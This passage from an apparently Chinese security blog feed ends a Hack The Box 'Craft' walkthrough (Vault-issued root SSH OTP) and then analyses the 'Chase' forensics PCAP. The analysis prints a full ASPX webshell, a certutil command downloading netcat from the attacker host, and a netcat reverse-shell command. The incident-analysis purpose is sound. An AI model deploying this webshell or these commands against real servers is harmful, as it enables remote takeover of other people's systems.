class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox/craft-infra/.ssh$ ssh -i id_rsa gilfoyle@10.10.10.110<br><br><br>  .   *   ..  . *  *<br>*  * @()Ooc()*   o  .<br>    (Q@*0CG*O()  ___<br>   |\_________/|/ _ \<br>   |  |  |  |  | / | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | \_| |<br>   |  |  |  |  |\___/<br>   |\_|__|__|_/|<br>    \_________/<br><br><br><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Linux craft.htb 4.9.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jun 16 01:32:37 2021 from 10.10.14.2<br>gilfoyle@craft:~$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">gilfoyle@craft:~$ vault login<br>Token (will be hidden): <br>Success! You are now authenticated. The token information displayed below<br>is already stored <span class="hljs-keyword">in</span> the token helper. You <span class="hljs-keyword">do</span> NOT need to run <span class="hljs-string">&quot;vault login&quot;</span><br>again. Future Vault requests will automatically use this token.<br><br>Key                  Value<br>---                  -----<br>token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103<br>token_duration       ∞<br>token_renewable      <span class="hljs-literal">false</span><br>token_policies       [<span class="hljs-string">&quot;root&quot;</span>]<br>identity_policies    []<br>policies             [<span class="hljs-string">&quot;root&quot;</span>]<br>gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1<br>Key                Value<br>---                -----<br>lease_id           ssh/creds/root_otp/6843253c-c9d7-b905-0dce-c5eb0227e646<br>lease_duration     768h<br>lease_renewable    <span class="hljs-literal">false</span><br>ip                 127.0.0.1<br>key                30f549eb-6351-79b4-9da0-96e1927769c5<br>key_type           otp<br>port               22<br>username           root<br>gilfoyle@craft:~$ <br></code></pre></td></tr></table></figure><p>vault这个东西我也是第一次接触，网上找了相关文档，发现key就可以当做ssh链接的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">   |\_________/|/ _ \<br>   |  |  |  |  | / | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | \_| |<br>   |  |  |  |  |\___/<br>   |\_|__|__|_/|<br>    \_________/<br><br><br><br>(root@10.10.10.110) Password: <br>Linux craft.htb 4.9.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jun 16 01:32:59 2021 from 127.0.0.1<br>root@craft:~<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Chase</title>
    <link href="/post/HackTheBox-Chase.html"/>
    <url>/post/HackTheBox-Chase.html</url>
    
    <content type="html"><![CDATA[<p>One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it.  We’ve taken a network capture before shutting the server down to take a clone of the disk.  Can you take a look at the PCAP and see if anything is up?</p><p>我们的一个网络服务器触发了反病毒警报，但没有一个系统管理员说他们登录过。在关闭服务器进行磁盘克隆之前，我们已经进行了网络捕获。你能看看PCAP，看看有什么进展吗?</p><p>Start：</p><p>首先我决定看一眼流量组成部分，在wireshark统计-&gt;协议分级中，</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609145027142.png" alt="image-20220609145027142"></p><p>UDP占比2.8，TCP占比97.2，在TCP中又大一部分的HTTP流量，所以应该着重查看HTTP协议中的流量信息，进行初步筛选：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609150106984.png" alt="image-20220609150106984"></p><p>可以很明显的看到两个IP，22.22.22.7:33618端口与22.22.22.5:80在进行访问通信。高端口一般出现在客户端，而80端口应该就是被攻击的网络服务器。也正如我想的这样。介于是HTTP明文流量。可以直接追踪TCP流。</p><p>这是初始访问的流量信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609150941045.png" alt="image-20220609150941045"></p><p>应该是被访问到了首页，因为它请求了一个welcome.png的欢迎图片。紧接着攻击者访问了upload.aspx像是文件上传的地方：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609151206121.png" alt="image-20220609151206121"></p><p>会包含有一些HTLM代码，将其复制到文本文件中打开后是这样的一个页面：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609151319151.png" alt="image-20220609151319151"></p><p>一个文件上传的功能点。紧接着，攻击者上传了一个文件，提交一个Key为admin的弱验证：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.aspx?operation=upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------240279915540934710361858528148<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1899<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/upload.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;authKey&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">admin</span></span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;cmd.aspx&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%@ Page <span class="hljs-keyword">Language</span>=&quot;VB&quot; <span class="hljs-keyword">Debug</span>=&quot;true&quot; %&gt;</span><br><span class="language-pgsql">&lt;%@ <span class="hljs-keyword">import</span> Namespace=&quot;system.IO&quot; %&gt;</span><br><span class="language-pgsql">&lt;%@ <span class="hljs-keyword">import</span> Namespace=&quot;System.Diagnostics&quot; %&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script runat=&quot;server&quot;&gt;      </span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Sub RunCmd(Src <span class="hljs-keyword">As</span> <span class="hljs-keyword">Object</span>, E <span class="hljs-keyword">As</span> EventArgs)            </span><br><span class="language-pgsql">  Dim myProcess <span class="hljs-keyword">As</span> <span class="hljs-built_in">New</span> Process()            </span><br><span class="language-pgsql">  Dim myProcessStartInfo <span class="hljs-keyword">As</span> <span class="hljs-built_in">New</span> ProcessStartInfo(xpath.text)            </span><br><span class="language-pgsql">  myProcessStartInfo.UseShellExecute = <span class="hljs-keyword">false</span>            </span><br><span class="language-pgsql">  myProcessStartInfo.RedirectStandardOutput = <span class="hljs-keyword">true</span>            </span><br><span class="language-pgsql">  myProcess.StartInfo = myProcessStartInfo            </span><br><span class="language-pgsql">  myProcessStartInfo.Arguments=xcmd.text            </span><br><span class="language-pgsql">  myProcess.<span class="hljs-keyword">Start</span>()            </span><br><span class="language-pgsql"></span><br><span class="language-pgsql">  Dim myStreamReader <span class="hljs-keyword">As</span> StreamReader = myProcess.StandardOutput            </span><br><span class="language-pgsql">  Dim myString <span class="hljs-keyword">As</span> String = myStreamReader.Readtoend()            </span><br><span class="language-pgsql">  myProcess.<span class="hljs-keyword">Close</span>()            </span><br><span class="language-pgsql">  mystring=replace(mystring,&quot;&lt;&quot;,&quot;&amp;lt;&quot;)            </span><br><span class="language-pgsql">  mystring=replace(mystring,&quot;&gt;&quot;,&quot;&amp;gt;&quot;)            </span><br><span class="language-pgsql">  result.text= vbcrlf &amp; &quot;&lt;pre&gt;&quot; &amp; mystring &amp; &quot;&lt;/pre&gt;&quot;    </span><br><span class="language-pgsql"><span class="hljs-keyword">End</span> Sub</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;/script&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;html&gt;</span><br><span class="language-pgsql">&lt;body&gt;    </span><br><span class="language-pgsql">&lt;form runat=&quot;server&quot;&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;L_p&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Program&lt;/asp:Label&gt;        </span><br><span class="language-pgsql">&lt;asp:TextBox id=&quot;xpath&quot; runat=&quot;server&quot; Width=&quot;300px&quot;&gt;c:\windows\system32\cmd.exe&lt;/asp:TextBox&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;L_a&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Arguments&lt;/asp:Label&gt;        </span><br><span class="language-pgsql">&lt;asp:TextBox id=&quot;xcmd&quot; runat=&quot;server&quot; Width=&quot;300px&quot; <span class="hljs-type">Text</span>=&quot;/c net user&quot;&gt;/c net <span class="hljs-keyword">user</span>&lt;/asp:TextBox&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Button id=&quot;Button&quot; onclick=&quot;runcmd&quot; runat=&quot;server&quot; Width=&quot;100px&quot; <span class="hljs-type">Text</span>=&quot;Run&quot;&gt;&lt;/asp:Button&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;result&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;       </span><br><span class="language-pgsql">&lt;/form&gt;</span><br><span class="language-pgsql">&lt;/body&gt;</span><br><span class="language-pgsql">&lt;/html&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148--</span></span><br></code></pre></td></tr></table></figure><p>不难看出这是一个webshell，因为在我复制代码进文档后Windows Defender也告警了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609152021384.png" alt="image-20220609152021384"></p><p>紧接着服务器返回了OK：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>private<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Microsoft-IIS/7.5<br><span class="hljs-attribute">X-AspNet-Version</span><span class="hljs-punctuation">: </span>2.0.50727<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>ASP.NET<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 01 Nov 2020 17:20:35 GMT<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>360<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>filesystembrowser<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css">&lt;!--</span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-tag">body</span>,<span class="hljs-selector-tag">table</span>,<span class="hljs-selector-tag">p</span>,pre,<span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">input</span>,<span class="hljs-selector-tag">form</span> select &#123;</span></span><br><span class="language-css"><span class="language-xml"> <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Lucida Console&quot;</span>, monospace;</span></span><br><span class="language-css"><span class="language-xml"> <span class="hljs-attribute">font-size</span>: <span class="hljs-number">88%</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml">--&gt;</span></span><br><span class="language-css"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">File uploaded<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后攻击者以get方式请求了webshell，这一步应该是确认是否上传成功，服务器返回了200 OK：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-apache"><span class="hljs-attribute">HTTP</span> /<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-attribute">Cache</span>-Control: private</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span></span><br><span class="language-apache"><span class="hljs-attribute">Server</span>: Microsoft-IIS/<span class="hljs-number">7</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-AspNet-Version: <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-Powered-By: ASP.NET</span><br><span class="language-apache"><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">01</span> Nov <span class="hljs-number">2020</span> <span class="hljs-number">17</span>:<span class="hljs-number">20</span>:<span class="hljs-number">42</span> GMT</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">917</span></span><br></code></pre></td></tr></table></figure><p>紧接着攻击者以POST方式提交了一串命令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>313<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/cmd.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">__VIEWSTATE<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEPDwUKLTk<span class="hljs-number">5</span>MjkzMTA<span class="hljs-number">5</span>MWRkwVojPOuktGOWqG<span class="hljs-number">0</span>pwsyOK<span class="hljs-number">2</span>JElGI<span class="hljs-variable">%3</span>D&amp;__EVENTVALIDATION<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEWBAKI<span class="hljs-number">2</span>YrhDgL<span class="hljs-number">71</span>d<span class="hljs-number">7</span>YCAKRuYD<span class="hljs-number">5</span>CALT<span class="hljs-variable">%2</span>Fr<span class="hljs-number">7</span>ABAPkkpTQLNd<span class="hljs-number">7</span>HWr<span class="hljs-number">8</span>RlrYcnI<span class="hljs-number">0</span>Hcmr&amp;xpath<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cwindows<span class="hljs-variable">%5</span>Csystem<span class="hljs-number">32</span><span class="hljs-variable">%5</span>Ccmd.exe&amp;xcmd<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>Fc+certutil+-urlcache+-split+-f+http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">22.22</span>.<span class="hljs-number">22.7</span><span class="hljs-variable">%2</span>Fnc<span class="hljs-number">64</span>.exe+<span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cusers<span class="hljs-variable">%5</span>Cpublic<span class="hljs-variable">%5</span>Cnc.exe&amp;Button<span class="hljs-operator">=</span>Run</span><br></code></pre></td></tr></table></figure><p>将其解码之后：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/c+certutil+-urlcache+-split+-f+http://22.22.22.7/nc64.exe+c:\users\public\nc.exe&amp;Button<br></code></pre></td></tr></table></figure><p>通过windows内置的白名单程序远程下载了nc并保存到了c:\users\public\目录下。之后都是服务器200OK的返回包，紧接着攻击者对webshell发起了第二个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>458<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/cmd.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">__VIEWSTATE<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEPDwUKLTk<span class="hljs-number">5</span>MjkzMTA<span class="hljs-number">5</span>MQ<span class="hljs-number">9</span>kFgICAQ<span class="hljs-number">9</span>kFgICCw<span class="hljs-number">8</span>PFgIeBFRleHQFaw<span class="hljs-number">0</span>KPHByZT<span class="hljs-number">4</span>qKioqICBPbmxpbmUgICoqKioNCiAgMDAwMCAgLi<span class="hljs-number">4</span>uDQogIGIwZDgNCkNlcnRVdGlsOiAtVVJMQ<span class="hljs-number">2</span>FjaGUgY<span class="hljs-number">29</span>tbWFuZCBjb<span class="hljs-number">21</span>wbGV<span class="hljs-number">0</span>ZWQgc<span class="hljs-number">3</span>VjY<span class="hljs-number">2</span>Vzc<span class="hljs-number">2</span>Z<span class="hljs-number">1</span>bGx<span class="hljs-number">5</span>Lg<span class="hljs-number">0</span>KPC<span class="hljs-number">9</span>wcmU<span class="hljs-variable">%2</span>BZGRk<span class="hljs-number">8</span>LGROcfmxzGiIEGxxlI<span class="hljs-number">6</span>IHeRdyA<span class="hljs-variable">%3</span>D&amp;__EVENTVALIDATION<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEWBAKQ<span class="hljs-number">5</span>ISyAgL<span class="hljs-number">71</span>d<span class="hljs-number">7</span>YCAKRuYD<span class="hljs-number">5</span>CALT<span class="hljs-variable">%2</span>Fr<span class="hljs-number">7</span>ABJjJbr<span class="hljs-variable">%2</span>Fu<span class="hljs-number">6</span>tvYS<span class="hljs-number">9</span>iG<span class="hljs-number">9</span><span class="hljs-keyword">x</span><span class="hljs-number">2</span>jvQ<span class="hljs-variable">%2</span>BMU<span class="hljs-number">8</span>CJ&amp;xpath<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cwindows<span class="hljs-variable">%5</span>Csystem<span class="hljs-number">32</span><span class="hljs-variable">%5</span>Ccmd.exe&amp;xcmd<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>Fc+<span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cusers<span class="hljs-variable">%5</span>Cpublic<span class="hljs-variable">%5</span>Cnc.exe<span class="hljs-number">+22.22</span>.<span class="hljs-number">22.7</span><span class="hljs-number">+4444</span>+-e+cmd.exe&amp;Button<span class="hljs-operator">=</span>Run</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/c+c:\users\public\nc.exe+22.22.22.7+4444+-e+cmd.exe&amp;Button=Run<br></code></pre></td></tr></table></figure><p>他在建立反向shell。至此HTTP协议就完了。紧接着需要查看TCP流量，鉴于攻击者反弹的是4444端口，那我只需锁定4444端口的TCP流量即可：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609153311443.png" 